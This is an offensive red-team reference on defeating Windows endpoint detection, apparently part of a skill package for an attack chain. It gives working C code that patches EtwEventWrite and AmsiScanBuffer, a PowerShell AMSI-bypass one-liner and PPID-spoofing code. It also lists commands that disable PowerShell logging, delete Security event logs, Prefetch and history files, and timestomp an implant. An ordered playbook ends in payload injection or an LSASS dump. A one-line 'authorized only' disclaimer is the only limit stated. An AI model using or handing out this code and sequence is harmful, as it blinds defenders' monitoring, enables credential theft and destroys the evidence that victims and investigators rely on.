# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> For authorized Red Team / adversarial emulation / internal product testing ONLY. Strictly forbidden for unauthorized targets.

EDR detection capabilities rely heavily on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document summarizes Red Team countermeasures against these two pipelines, supplemented with anti-forensics combinations such as Sysmon / PowerShell logging / timestomping.

Aligned with MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internal Architecture

ETW is a built-in high-performance event tracing framework in Windows, used by EDRs for "lightweight kernel telemetry".
Providers of primary interest to Red Teams:

| Provider GUID | Name | Consumers |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Process / thread base events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR initialization |

### Critical User-Mode APIs

| API | DLL | Purpose |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Event writing (most common) |
| `EtwEventWriteFull` | `ntdll.dll` | Event writing with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | Underlying layer of EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | Control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | Check if provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register provider |

### Call Chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → Consumers (EDR user-mode process subscribing session)
```

## 2. Three Methods for ETW Patching

### Method A: EtwEventWrite Head Patch

Directly patch the entry point of `ntdll!EtwEventWrite` to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

Patched (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C Code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC Warning**: Writing to ntdll memory itself triggers `ALPC_MODIFY_PROCESS` / `PROTECTVM` telemetry in ETW-TI.
Must **use indirect syscalls + bypass NtProtectVirtualMemory hooks BEFORE patching**,
Otherwise EDR receives alerts before the patch takes effect.

### Method B: EtwEventEnabled Always-False

More stealthy: Instead of modifying `EtwEventWrite`, force `EtwEventEnabled` to return FALSE,
Causing the application layer to infer "provider disabled" → skips calling `EtwEventWrite`. This is friendly against memory hash integrity checks (many EDRs checksum `EtwEventWrite` bytes).

```c
// EtwEventEnabled typically returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: Disable Provider via NtTraceControl

Use syscalls to directly disable EDR sessions (intrusive, but avoids modifying ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher
// Suitable for Local Admin after UAC bypass
```

Rarely used in practice because:

- Stopping sessions triggers "ETW provider stopped" events detected by other channels
- Requires high privileges

### Method D: Kernel-Mode ETW Patch (Only with BYOVD/Kernel R/W)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Directly set to 0 to discard all ETW-TI events
```

Belongs to the BYOVD phase of `attack-chain`; not covered in detail here.

## 3. AMSI Bypass

AMSI is the Windows interface provided to PowerShell / .NET / WMI / VBA for antivirus scanning before script execution.
Red Teams most frequently encounter PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// Write at amsi.dll!AmsiScanBuffer entry point:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-liner version (for detection reference only; signatured / intercepted by Defender):

```powershell
# Proof of Concept — Real environments must use obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Technique 1: Hardware Breakpoint AMSI Bypass

Without modifying amsi.dll memory (avoids triggering integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at `AmsiScanBuffer` entry point
3. Upon VEH hit, set `RAX = 0x80070057`, `RIP = ret instruction address`, `RSP += 8`
4. ContinueExecution

Shares the same infrastructure as HWBP Blindside in `unhook-techniques.md`; can reuse the same VEH.

### Advanced Technique 2: AmsiContext / AmsiSession Corruption

Construct a malformed `AmsiContext` structure so `AmsiScanBuffer` returns success early due to internal checksum failure:

```text
// AmsiContext header should be "AMSI" magic bytes
// Change to "XXXX" → AmsiScanBuffer internal checksum fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced Technique 3: Reflective Loading of Copy amsi.dll

Instead of using system amsi.dll, reflectively load a clean copy into own process and redirect PowerShell engine calls.
Applies to advanced EDRs that intercept PowerShell.exe startup during the module loading phase.

## 4. Anti-Forensics: Clearing Traces

### Disable PowerShell ScriptBlock Logging

```powershell
# Registry (Requires Administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell History

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Complete wipe (Aggressive, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL Logs

```powershell
# Stop session before deleting etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: Directly deleting .evtx causes Event Log Service to recreate and write "log cleared" event (Event ID 1102)
# More covert: Patch EventLog APIs of wevtsvc.dll in memory (belongs to T1070.001)
```

### Timestomping (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evading Sysmon Telemetry

Sysmon is the most common free telemetry solution (frequently configured with olaf modular rules).
Critical Events:

| Event ID | Description |
|----------|------|
| 1 | ProcessCreate (incl. PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion Strategies

1. **Avoid creating new processes** — Execute entirely inside injected process to skip Event ID 1
2. **PPID Spoofing** — Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set PPID to `explorer.exe`, making Sysmon ProcessCreate appear legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + Unmodified Images** — Process Hollowing is captured by Event ID 25 in newer Sysmon.
   Prefer **module stomping** (overwriting sections of loaded legitimate DLLs) or **dirty vanity** with PPID spoofing.
4. **Avoid remote threads** — Skip Event ID 8; use `NtCreateThreadEx` in own process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — Skip Event ID 22

## 6. Call Stack Spoofing + Timestomping to Mimic Legitimate Software

Even if ProcessCreate cannot be avoided (e.g., scenarios requiring child process spawning):

- Change CommandLine format to resemble legitimate software
- PPID spoof to services.exe (masquerade as SCM started service)
- Modify Image hash seen by ImageLoad: Place implant code into signed DLL memory via module stomping
- Combine with CallStackSpoofer: Sysmon won't observe implant frames even with EnableCallTracing enabled

## 7. Operational OPSEC: Execution Sequence

**Incorrect order triggers EDR alerts prematurely**, terminating subsequent actions immediately.

Correct Order:

```text
1. AMSI bypass (HWBP prioritized to avoid writing amsi.dll)
   ─── Prevents scanning when .NET / PowerShell loads implant
2. ETW patch (Patch EtwEventWrite before executing any syscalls)
   ─── Blinds telemetry for subsequent actions
3. NtProtectVirtualMemory called via indirect syscall
   ─── Establishes a secure memory permission transition channel
4. Unhook ntdll (Peruns Fart) or enable indirect syscalls
   ─── Strips user-mode hooks
5. Call stack spoof setup
   ─── Prepares fake stack frames for all subsequent syscalls
6. Execute actual payload (injection / lateral movement / LSASS dump)
7. Clear traces (PowerShell history / Prefetch / Timestomping)
```

Incorrect Order Example:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC receives alert
❌ Dump LSASS first → AMSI / ETW not silenced → High-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching Overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass Collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing Feedback

After completing the trilogy (Hook Survey → Unhooking → Telemetry Blinding), return to Step 5 of `SKILL.md` for sandbox verification,
then proceed to the next phase according to the Initial Access and Lateral Movement sections of `attack-chain/`.
